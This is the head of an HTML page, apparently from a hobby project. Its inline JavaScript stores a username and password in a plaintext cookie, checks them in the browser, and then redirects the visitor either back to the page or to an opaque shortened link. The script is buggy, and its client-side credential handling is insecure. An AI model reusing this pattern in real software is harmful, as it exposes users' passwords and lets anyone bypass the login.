<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script>
    function setCookie(cname,cvalue,exdays) {
        const d = new Date();
        d.setTime(d.getTime() + (exdays*24*60*60*1000));
        let expires = "expires=" + d.toUTCString();
        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=./";
      }

      function setSessionCookie(cname,cvalue) {
        let expires = "expires=Fri, 31 Dec 9999 23:59:59 GMT"
        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=./";
      }
      
      function getCookie(cname) {
        let name = cname + "=";
        let decodedCookie = decodeURIComponent(document.cookie);
        let ca = decodedCookie.split(';');
        for(let i = 0; i < ca.length; i++) {
          let c = ca[i];
          while (c.charAt(0) == ' ') {
            c = c.substring(1);
          }
          if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
          }
        }
        return "";
      }
    
      function eraseCookie(cname) {   
        document.cookie = cname+'=; Max-Age=-99999999;';  
      }

        function checkCookieIfValid() {
            var $cookie = getCookie("information");

            if ($cookie.includes("username:&")) {
                window.location.href = './';
                setCookie("auth_failed", "true", 999999);
                eraseCookie("information");
            } else if ($cookie.includes("&password:&")) {
                window.location.href = './';
                setCookie("auth_failed", "true", 999999);
                eraseCookie("information");
            } else {
                console.log('ok');
                window.location.href = 'https://bit.do/YeetYeet';
            }
        }
        window.onload = checkCookieIfValid();

        window.onload = function eraseOneTimeCookie(){
          if(getCookie("information").includes("remember:off")){
            eraseCookie('information');
          }
        }
    </script>
